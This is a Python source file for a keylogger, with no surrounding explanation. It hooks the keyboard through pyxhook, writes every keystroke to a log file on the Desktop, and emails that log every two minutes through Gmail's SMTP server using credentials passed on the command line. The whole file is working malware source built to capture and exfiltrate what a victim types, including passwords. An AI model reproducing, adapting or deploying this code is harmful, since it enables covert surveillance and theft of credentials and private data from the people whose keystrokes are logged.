import os,sys
import pyxhook
import time,smtplib
import argparse

parser=argparse.ArgumentParser(description="Data related to keylogger working")
parser.add_argument("-e","--email",type=str,help="email address of sender")
parser.add_argument("-p","--password",type=str,help="password of your account")
args=parser.parse_args()

#if found then assign log_file=pylogger_file else log_file=<user home directory/Desktop/file.log

log_file=os.environ.get("pylogger_file",os.path.expanduser("~/Desktop/file.log"))

file_name="touch %s"%(log_file)
os.system(file_name)


def onkeypress(event):
    with open(log_file,"a") as f:
        f.write("{}\n".format(event.Key))


#main work start here


new_hook=pyxhook.HookManager()
new_hook.KeyDown=onkeypress

new_hook.HookKeyboard()
try:
    new_hook.start()
except KeyboardInterrupt:
    pass
except Exception as ex:
    msg="Error while catching events:\n {}".format(ex)
    pyxhook.print_err(msg)
    with open(log_file,"a") as f:
        f.write("\n{}".format(msg))
      

def read_template(filename):
    with open(filename,"r",encoding="utf-8") as template_file:
        template_file_content=template_file.read()
    return template_file_content    



email=args.email
password=args.password

while True:
    try:
        s=smtplib.SMTP(host="smtp.gmail.com",port=587) #your mail server address and port n......
    except smtplib.SMTPConnectError:
        print("..cannot established connection to the server..\n exiting..")
        sys.exit(1)
    s.ehlo()
    s.starttls()
    s.ehlo()
    s.login(email,password) # user email and password to login into the acccount
    msg=read_template(log_file)
    s.sendmail(email,email,msg)#sender mail address and receiver mail address
    del msg
    s.quit()
    time.sleep(120)


